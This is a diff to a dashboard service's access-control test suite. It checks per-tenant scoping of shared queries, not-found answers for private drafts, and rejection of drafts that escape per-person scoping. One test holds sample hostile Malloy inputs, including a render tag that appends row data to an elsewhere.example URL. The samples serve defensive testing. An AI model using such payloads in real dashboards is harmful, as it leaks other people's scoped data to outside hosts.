@@ -47,10 +47,24 @@ import {
 import { allDashboardsByDataset, getDashboard, listDashboards, listDashboardsAndDrafts } from "@/lib/dashboards";
 import { deleteDraft, getDraftFiles, recordPromotion, saveDraftDashboard } from "@/lib/dashboards/draft";
 import { getSharing, setDashboardVisibility, shareDashboard, unshareDashboard } from "@/lib/dashboards/sharing";
-import { datasetAccessWhere, MALLOYYO_ADMIN, MALLOYYO_USER, openToMemberSql, roleLevelUpdate } from "@/lib/roles";
+import {
+  datasetAccessWhere,
+  MALLOYYO_ADMIN,
+  MALLOYYO_USER,
+  openToMemberSql,
+  othersActivityReadableSql,
+  roleLevelUpdate,
+} from "@/lib/roles";
 import { openToMembers, resolveAccess } from "@/lib/role-access";
 import { buildHostedExploreSurface } from "@/lib/mcp-host";
-import { canQueryDataset, canReadDataset, findByDatasetRef, findBySource, runQueryForWeb } from "@/lib/mcp-tools";
+import {
+  canQueryDataset,
+  canReadDataset,
+  findByDatasetRef,
+  findBySource,
+  maySeeSharedQuery,
+  runQueryForWeb,
+} from "@/lib/mcp-tools";
 
 const DS = "audience";
 let admin: User, author: User, member: User, viewer: User, outsider: User;
@@ -340,6 +354,43 @@ test("the retired public flag opens nothing: a role's level is the only grant", 
       ).length === 1;
     assert.deepEqual([await readableBy(outsider.id), await readableBy(nonMember.id)], [true, false]);
 
+    // AND NOT ON A DATASET SCOPED PER PERSON. Every tenant may open one; what
+    // each sees in it differs, so one tenant's questions and query text (filter
+    // values, customer names) are not another's to read. The rule looked only
+    // at who may open the dataset, and so handed them over.
+    const othersReadableBy = async (userId: string) =>
+      (
+        await db
+          .select({ id: datasets.id })
+          .from(datasets)
+          .where(and(eq(datasets.id, flagged.id), othersActivityReadableSql(userId)))
+      ).length === 1;
+    assert.equal(await othersReadableBy(outsider.id), true, "unscoped and open to every member: readable");
+    await db.update(datasets).set({ requiredGivens: ["MALLOYYO_EMAIL"] }).where(eq(datasets.id, flagged.id));
+    const [scoped] = await db.select().from(datasets).where(eq(datasets.id, flagged.id));
+    assert.equal(await othersReadableBy(outsider.id), false, "scoped per person: not readable");
+    assert.equal(canReadDataset(scoped, { id: outsider.id, roles: [MALLOYYO_USER] }, false), false);
+    assert.equal(canReadDataset(scoped, { id: outsider.id, roles: [MALLOYYO_USER] }, true), true, "an admin still reads everything");
+
+    // A share slug follows the same rule, with one addition: whoever ran the
+    // query may always see it — it is theirs — scoped dataset or not.
+    await db.insert(history).values({
+      userId: member.id,
+      datasetId: flagged.id,
+      toolName: "query",
+      source: "s",
+      malloyInput: "run: s -> { select: n }",
+      slug: "main_scopedslug01",
+    });
+    const viewerOf = (p: { id: string }, r: string[]) => ({ id: p.id, roles: r, admin: false });
+    assert.equal(await maySeeSharedQuery(viewerOf(member, [MALLOYYO_USER]), "main_scopedslug01", flagged.id), true, "its author");
+    assert.equal(await maySeeSharedQuery(viewerOf(outsider, [MALLOYYO_USER]), "main_scopedslug01", flagged.id), false, "another tenant");
+    assert.equal(await maySeeSharedQuery({ ...viewerOf(outsider, []), admin: true }, "main_scopedslug01", flagged.id), true);
+    // No dataset on the row (it was deleted): nobody but the author.
+    assert.equal(await maySeeSharedQuery(viewerOf(outsider, [MALLOYYO_USER]), "main_scopedslug01", null), false);
+    await db.delete(history).where(eq(history.slug, "main_scopedslug01"));
+    await db.update(datasets).set({ requiredGivens: [] }).where(eq(datasets.id, flagged.id));
+
     // The migration left the dataset under test alone: it was never public.
     const [untouched] = await db.select().from(datasets).where(eq(datasets.id, datasetId));
     assert.deepEqual(untouched.roles, ["staff", "readers"]);
@@ -589,6 +640,54 @@ test("recording a promotion is an admin's, because of what it writes", async () 
   // that would be re-audiencing another draft.
   assert.equal(await recordPromotion(admin, DS, "mine", { name: "draft-everyones" }), "bad-name");
   assert.equal(await recordPromotion(admin, DS, "mine", { name: "  " }), "bad-name");
+});
+
+// A private draft is "not there" to someone who cannot open it — and that has
+// to be the answer everywhere a slug is taken, or the two that said "belongs to
+// someone else" confirm it exists.
+test("a private draft someone cannot open looks exactly like no draft", async () => {
+  const saved = await saveDraftDashboard(
+    author.id,
+    DS,
+    { name: "hidden", title: "Hidden", source: "export default () => null" },
+    "http://x",
+  );
+  assert.ok(saved.ok, saved.ok ? "" : saved.error);
+  if (!saved.ok) return;
+  // `member` has full on the dataset and is not the author; the draft is private.
+  assert.deepEqual(await deleteDraft(member, DS, saved.slug), { outcome: "not-found" });
+  const overwrite = await saveDraftDashboard(member.id, DS, { name: "hidden", slug: saved.slug, malloy: "x" }, "http://x");
+  assert.ok(!overwrite.ok && /no draft dashboard/.test(overwrite.error), overwrite.ok ? "" : overwrite.error);
+  const missing = await saveDraftDashboard(member.id, DS, { name: "hidden", slug: "nosuchslug", malloy: "x" }, "http://x");
+  assert.ok(!missing.ok && !overwrite.ok && missing.error.replace("nosuchslug", saved.slug) === overwrite.error, "the same words");
+
+  // Opened to the dataset, it IS there — and still not theirs to change.
+  assert.ok((await setDashboardVisibility(author, DS, `draft-${saved.slug}`, "dataset")).ok);
+  assert.deepEqual(await deleteDraft(member, DS, saved.slug), { outcome: "not-yours" });
+  assert.equal((await deleteDraft(author, DS, saved.slug)).outcome, "deleted");
+});
+
+// A draft's file is text a member wrote. On data scoped per person it is held
+// to the rule every caller-written query is: it may not define a join or name
+// the scoping given (either reads rows the scope hides), nor carry the render
+// tags that send a reader's rows elsewhere.
+test("a draft on a dataset scoped per person may not carry what gets past the scope", async () => {
+  await db.update(datasets).set({ requiredGivens: ["MALLOYYO_EMAIL"] }).where(eq(datasets.id, datasetId));
+  try {
+    const attempt = (malloy: string) =>
+      saveDraftDashboard(author.id, DS, { name: "escape", title: "Escape", malloy }, "http://x");
+    for (const malloy of [
+      'import "../index.malloy"\n# artifact { title="E" }\nquery: escape is s extend { join_cross: t is s } -> { select: n }\n',
+      'import "../index.malloy"\n# artifact { title="E" }\nquery: escape is s -> { select: n, w is $MALLOYYO_EMAIL }\n',
+      "import \"../index.malloy\"\n# artifact { title=\"E\" }\nquery: escape is s -> { select:\n  # image\n  p is concat('https://elsewhere.example/?d=', n::string)\n}\n",
+    ]) {
+      const out = await attempt(malloy);
+      assert.ok(!out.ok && /scoped per person/.test(out.error), out.ok ? "saved" : out.error);
+    }
+    assert.equal((await db.select().from(draftDashboards).where(eq(draftDashboards.name, "escape"))).length, 0, "nothing stored");
+  } finally {
+    await db.update(datasets).set({ requiredGivens: [] }).where(eq(datasets.id, datasetId));
+  }
 });
 
 test("deleting a draft takes its shares with it", async () => {
